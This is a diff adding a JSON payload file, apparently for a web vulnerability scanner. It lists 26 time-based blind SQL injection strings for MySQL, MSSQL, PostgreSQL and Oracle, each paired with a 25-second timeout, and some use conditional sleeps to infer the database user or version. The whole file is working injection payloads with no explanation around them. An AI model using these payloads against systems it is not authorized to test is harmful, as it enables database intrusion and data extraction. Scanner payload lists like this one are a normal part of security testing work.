@@ -1,0 +1,131 @@
+[{
+		"name": "Blind SQLi using XOR",
+		"payload": "1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",	
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "1'=sleep(25)='1",	
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi using SELECT query",
+		"payload": "'%2b(select*from(select(sleep(2)))a)%2b'",	
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": " WAITFOR DELAY '0:0:25';--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi using SLEEP()",
+		"payload": "') OR SLEEP(25)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "1') AND SLEEP(25) AND ('LoUL'='LoUL",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "' WAITFOR DELAY '0:0:25' and 'a'='a;--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": " IF 1=1 THEN dbms_lock.sleep(25);",	
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "; SLEEP(25)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": " SLEEP(25)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "' SLEEP(25)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "' SLEEP(25)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi using pg_sleep()",
+		"payload": " pg_sleep(25)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": " and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "' and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": " DBMS_LOCK.SLEEP(25);",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "1,'0');waitfor delay '0:0:25;--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "' and pg_sleep(25)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": ")) and pg_sleep(25)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "')) or pg_sleep(25)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "')) or sleep(25)--",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "(SELECT 1 FROM (SELECT SLEEP(25))A)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "'%2b(select*from(select(sleep(25)))a)%2b'",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "/**/xor/**/sleep(25)",
+		"timeout" : "25"
+	},
+	{
+		"name": "Blind SQLi",
+		"payload": "' or (sleep(25)+1) limit 1 --",
+		"timeout" : "25"
+	}
+]
